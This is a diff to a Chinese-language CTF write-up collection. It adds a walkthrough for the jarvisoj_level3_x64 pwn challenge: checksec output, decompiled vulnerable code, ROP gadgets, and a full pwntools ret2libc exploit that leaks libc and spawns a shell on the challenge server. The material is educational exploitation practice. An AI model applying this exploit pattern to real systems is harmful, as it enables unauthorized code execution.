@@ -821,7 +821,7 @@ ROPgadget --binary ./level2_x64 --string "/bin/sh"
 
 ![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/7.png)
 
-`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8D`、`R9D`，剩下的参数从右往左依次入栈。因此该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi`的地址为`0x4006B3`。
+`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。因此该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi`的地址为`0x4006B3`。
 
 ![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level2_x64/8.png)
 
@@ -1341,7 +1341,7 @@ io.interactive()
 
 ### [jarvisoj_level3](https://buuoj.cn/challenges#jarvisoj_level3)
 
-先`file ./level3  `查看文件类型，再`checksec --file=./level3  `检查文件保护情况。
+先`file ./level3`查看文件类型，再`checksec --file=./level3`检查文件保护情况。
 
 ```bash
 ┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
@@ -1456,6 +1456,119 @@ log.success('system_address => %s', hex(system_addr))
 bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
 log.success('bin_sh_address => %s', hex(bin_sh_addr))
 payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
+io.sendlineafter(b'Input:\n', payload)
+io.interactive()
+```
+
+------
+
+### [jarvisoj_level3_x64](https://buuoj.cn/challenges#jarvisoj_level3_x64)
+
+先`file ./level3_x64`查看文件类型，再`checksec --file=./level3_x64`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./level3_x64
+./level3_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./level3_x64
+[*] '/home/tyd/ctf/pwn/buuctf/level3_x64'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+用`IDA Pro 64bit`打开附件`level2_x64`，，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  vulnerable_function(argc, argv, envp);
+  return write(1, "Hello, World!\n", 0xEuLL);
+}
+```
+
+双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x80`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x200`，显然存在栈溢出漏洞。
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
+
+  write(1, "Input:\n", 7uLL);
+  return read(0, buf, 0x200uLL);
+}
+```
+
+双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x80`个字节占满`buf`变量，再用`0x8`个字节覆盖到栈帧`r`。
+
+```assembly
+-0000000000000080 ; D/A/*   : change type (data/ascii/array)
+-0000000000000080 ; N       : rename
+-0000000000000080 ; U       : undefine
+-0000000000000080 ; Use data definition commands to create local variables and function arguments.
+-0000000000000080 ; Two special fields " r" and " s" represent return address and saved registers.
+-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0
+-0000000000000080 ;
+-0000000000000080
+-0000000000000080 buf             db 128 dup(?)
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x4006b3`，`pop rsi; pop r15; ret`的地址是`0x4006b1`。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ ROPgadget --binary ./level3_x64 --only "pop|ret"  
+Gadgets information
+============================================================
+0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004006b0 : pop r14 ; pop r15 ; ret
+0x00000000004006b2 : pop r15 ; ret
+0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400550 : pop rbp ; ret
+0x00000000004006b3 : pop rdi ; ret
+0x00000000004006b1 : pop rsi ; pop r15 ; ret
+0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400499 : ret
+
+Unique gadgets found: 11
+```
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。编写`Python`代码尝试使用`LibcSearcher`求解`libc`基地址，选用的`Libc`为`libc6_2.23-0ubuntu10_amd64`，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`成功，`cat flag`得到`flag{1b9ca510-a63b-40f9-a036-28548b032739}`，提交即可。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 29665)
+elf = ELF('./level3_x64')
+main_addr = elf.symbols['main']
+write_plt = elf.plt['write'] 
+write_got = elf.got['write']
+pop_rdi = 0x4006b3  # pop rdi ; ret
+pop_rsi = 0x4006b1  # pop rsi ; pop r15 ; ret
+payload = b'a'*(0x80+0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
+io.sendlineafter(b'Input:\n', payload)
+write_addr = u64(io.recv(8))
+log.info('write_address => 0x%x', write_addr)
+libc = LibcSearcher('write', write_addr)
+libcbase = write_addr - libc.dump('write')
+log.success('libcbase_address => %s', hex(libcbase))
+system_addr = libcbase + libc.dump('system')
+log.success('system_address => %s', hex(system_addr))
+bin_sh_addr = libcbase + libc.dump('str_bin_sh')
+log.success('bin_sh_address => %s', hex(bin_sh_addr))
+payload = b'a'*(0x80+0x8) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
 io.sendlineafter(b'Input:\n', payload)
 io.interactive()
 ```
